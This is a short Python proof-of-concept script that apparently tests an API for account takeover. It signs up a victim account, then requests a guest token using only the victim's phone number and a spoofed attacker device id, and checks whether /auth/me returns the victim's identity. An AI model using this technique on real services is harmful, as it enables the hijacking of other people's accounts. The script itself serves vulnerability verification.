import sys, seclib
from lib import Client
name, api = sys.argv[1], sys.argv[2]
seclib.use(api)
V = seclib.signup('victim')
anon = Client()
r = anon.post('/auth/guest', {'phone': V['phone']}, headers={'x-device-id': 'attacker-device-0001'})
tok = r.get('token'); tok = tok if isinstance(tok, str) else (tok or {}).get('accessToken')
print(f'[{name}] victim id={V["user"]["id"]} phone={V["phone"]}')
print(f'[{name}] POST /auth/guest {{phone}} -> {r.status} user.id={(r.get("user") or {}).get("id")} is_guest={(r.get("user") or {}).get("is_guest")} token={"yes" if tok else "no"}')
me = Client(tok).get('/auth/me')
print(f'[{name}] GET /auth/me with that token -> {me.status} id={me.get("id")} email={me.get("email")}')
